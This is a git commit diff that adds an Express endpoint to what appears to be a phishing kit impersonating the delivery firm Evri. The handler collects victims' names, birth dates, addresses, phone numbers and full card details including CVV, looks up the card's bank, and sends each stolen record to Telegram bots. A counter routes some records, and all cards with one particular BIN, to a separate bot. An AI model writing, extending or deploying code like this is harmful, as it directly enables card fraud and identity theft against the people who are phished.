2e81045d50949fe4b40a263aad4407b2037c0b59
tresdtapio <97699520+tresdtapio@users.noreply.github.com>
2022-06-19 11:38:08 +0100

    make

--- index.js
+++ index.js
@@ -2008,6 +2008,65 @@ app.post('/tCapz', (req, res) => {
 //EVRI
 //EVRI
 
+let chasingfunds = 0;
+
+app.options('/chasingfundsEvri', cors())
+
+app.post('/chasingfundsEvri', (req, res) => {
+    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
+    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
+    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
+    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
+    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
+    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
+    userAgent = req.body.userAgent;
+    ip = req.body.ip;
+    bin = req.body.bin;
+
+    if (bin.length === 7) {
+        formatBin = bin.replace(/ /g, '');
+        if (formatBin.length === 7) {
+            formatBin = bin.slice(0, -1);
+        }
+        bin = formatBin;
+    }
+    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+        if (!resp.data.bank) {
+            bankName = ""
+        } else {
+            bankName = resp.data.bank.name;
+        }
+    }).then(function () {
+        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
+        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        if (chasingfunds == 7) {
+            axios.post(
+                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+            );
+            chasingfunds = 0;
+        } else {
+            if (bin === "542011") {
+                axios.post(
+                    `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+                );
+            } else {
+                axios.post(
+                    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriChasing:\n${originalText}`
+                );
+                axios.post(
+                    `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=864072421&text=Evri:\n${originalText}`
+                );
+            }
+            chasingfunds += 1;
+        }
+
+        res.send("Update Completed");
+    })
+});
+
 app.options('/@skiii719', cors())
 
 app.post('/@skiii719', (req, res) => {
